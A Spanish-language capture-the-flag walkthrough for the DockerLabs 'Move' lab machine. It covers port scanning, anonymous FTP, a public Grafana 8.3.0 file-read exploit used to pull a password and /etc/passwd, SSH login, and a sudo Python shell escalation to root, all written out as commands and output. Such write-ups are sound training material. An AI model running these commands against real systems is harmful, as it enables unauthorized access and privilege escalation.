Lo primero que tenemos que hacer, es ir a la pagina de "dockerlabs.es" y bajarnos la maquina "Move".
Una vez hecho y COMO SIEMPRE, descomprimimos el archivo, e inicializamos la maquina con el comando:
```
sudo bash auto_deploy.sh move.tar
```
Lo primero de todo, tras desplegarse la maquina, es hacer un NMAP. No necesitamos hacer un ARP-SCAN (o NETDISCOVER), porque ya sabemos la IP de la maquina victima.
```
nmap -p- --open -sCV -sS --min-rate 5000 172.17.0.2 -n -Pn -vvv
```
Una vez terminado, vemos que tiene abiertos 4 puertos:
```
Discovered open port 21/tcp on 172.17.0.2
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 3000/tcp on 172.17.0.2
```
Probamos primero el puerto 80, por lo que pondremos en el navegador la IP, pero nos aparece una simple pagina de Apache.
Hora del puerto 21 (FTP), como nos permite entrar como el usuario "anonymous", tal y como se ve aqui abajo, probaremos suerte:
```
21/tcp   open  ftp     syn-ack ttl 64 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
```
Entramos y vemos que hay un directorio llamado "mantenimiento", dentro del cual, hay un archivo llamado "database.kdbx", el cual nos descargaremos:
```
ftp> ls
229 Entering Extended Passive Mode (|||33603|)
150 Here comes the directory listing.
drwxrwxrwx    1 0        0            4096 Mar 29 09:28 mantenimiento

ftp> cd mantenimiento
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||35291|)
150 Here comes the directory listing.
-rwxrwxrwx    1 0        0            2021 Mar 29 09:26 database.kdbx
226 Directory send OK.

ftp> get database.kdbx
local: database.kdbx remote: database.kdbx
229 Entering Extended Passive Mode (|||13729|)
150 Opening BINARY mode data connection for database.kdbx (2021 bytes).
100% |************************************************************|  2021       10.64 MiB/s    00:00 ETA
226 Transfer complete.
2021 bytes received in 00:00 (3.66 MiB/s)
```
Este archivo llamado "database.kdbx", es una BBDD con contraseña KeePass, por lo que vamos a intentar obtener obtener el hash con "keepass2john":
```
keepass2john database.kdbx > hashDatabase
```
Desgraciadamente, no es posible y nos tira un error, tal y como se ve a continuacion:
```
! database.kdbx : File version '40000' is currently not supported!
```
Viendo que es un camino sin salida, y como por el puerto 22 (SSH), no podemos entrar, vamos a ver si se puede hacer algo con el puerto 3000.
Para ello, en el navegador ponemos la IP de la maquina y el puerto:
```
172.17.0.2:3000
```
Y vemos que aparece un panel de Login con el software "Grafana". Tambien podemos ver que es la version 8.3.0, lo que nos podria servir para buscar vulnerabilidades con "searchsploit" mas tarde. Ahora, no obstante, haremos un poco de FUZZING WEB para ver que encontramos:
```
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x php,html
```
Una vez finalizado "gobuster", encontramos lo siguiente:
```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 10701]
/.html                (Status: 403) [Size: 275]
/maintenance.html     (Status: 200) [Size: 63]
/.html                (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 830572 / 830576 (100.00%)
===============================================================
Finished
===============================================================
```
Por lo que se ve, todas parecen "normales" excepto la de "maintenance.html", asi que probaremos a ponerla en el navegador y curiosamente vemos el mensaje:
```
 Website under maintenance, access is in /tmp/pass.txt
```
Bien, interesante... parece que la contraseña esta en el archivo "/tmp/pass.txt", pero como no podemos acceder aun, vamos a tirar de "searchsploit" tal y como se ve a continuacion:
```
searchsploit grafana 8.3.0

--------------
Exploit Title
--------------
Grafana 8.3.0 - Directory Traversal and Arbitrary File Read 

--------------
Path
--------------
multiple/webapps/50581.py

```
Tal y como se puede observar, existe para la version 8.3.0 un exploit en python llamado "50581.py", por lo que vamos a intentar localizarlo mediante el comando "locate", y recibimos el siguiente mensaje:
```
locate 50581.py

/usr/share/exploitdb/exploits/multiple/webapps/50581.py
```
Vale, es hora de hacerse una copia de este exploit a nuestro directorio de trabajo con el comando:
```
cp /usr/share/exploitdb/exploits/multiple/webapps/50581.py moveSploit.py
```
A continuacion,  ejecutamos el exploit:
```
python3 moveSploit.py -H https://172.17.0.2:3000

	-H = Hay que poner la ruta completa (incluido puerto) del host
```
Una vez hecho, nos sale un pequeño "prompt" que nos pedira un archivo a leer:
```
Read file > /tmp/pass.txt

t9sH76gpQ82UFeZ3GXZS
```
Como se observa, hemos utilizado el archivo "/tmp/pass.txt" porque es el que nos ponia en la pagina Web de "mantenimiento.html"
Vamos a probar ahora algo mas "dificil", que seria acceder al archivo "/etc/passwd" a ver si suena la flauta:
```
Read file > /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:101::/nonexistent:/usr/sbin/nologin
ftp:x:101:104:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
grafana:x:103:105::/usr/share/grafana:/bin/false
freddy:x:1000:1000::/home/freddy:/bin/bash
```
Si nos fijamos justo en la ultima linea, hay un usuario llamado "freddy" por lo que vamos a probar con este usuario y la contraseña obtenida antes, a ver si podemos acceder al puerto SSH (22):
```
ssh freddy@172.17.0.2
```
Tras contestar "yes" a las fingerprints, y poner la contraseña, vemos que estamos dentro :) !!
```
┌──(freddy㉿d7db4525ef5a)-[~]
└─$ whoami                                                                  
freddy
```
Sin embargo, lo suyo es intentar la escalada de privilegios, por lo que probaremos con el tipico comando "sudo -l" y obtenemos:
```
sudo -l

Matching Defaults entries for freddy on d7db4525ef5a:
    env_reset, mail_badpass,    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User freddy may run the following commands on d7db4525ef5a:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/maintenance.py
```
Tal y como vemos, podriamos ejecutar el archivo "/opt/maintenance.py". Ademas, python tambien seria posible, asi que vamos a buscar en "gtfobins", o con "searchbins", como se haria la escalada con python:
```
searchbins -b python -f sudo 

[+] Binary: python

================================================================================
[*] Function: sudo -> [https://gtfobins.github.io/gtfobins/python/#sudo]

    | sudo python -c 'import os; os.system("/bin/sh")'
```
Viendo esto, simplemente tendriamos que cambiar el contenido del archivo "/opt/maintenance.py" y meter:
```
┌──(freddy㉿d7db4525ef5a)-[~]
└─$ nano /opt/maintenance.py

import os;
os.system("/bin/sh")
```
Ahora solo nos quedaria guardar y ejecutar:
```
┌──(freddy㉿d7db4525ef5a)-[~]
└─$ sudo /usr/bin/python3 /opt/maintenance.py

# whoami
root
#
```
Como se puede ver, ya somos "root". Es momento de obtener un prompt mas "bonito" con el comando "bash -p":
```
# bash -p

┌──(root㉿d7db4525ef5a)-[/home/freddy]
└─# whoami
root

┌──(root㉿d7db4525ef5a)-[/home/freddy]
└─# 
```
Finalmente, tenemos un prompt "root" normal. Y hecho esto ya estaria la maquina acabada.
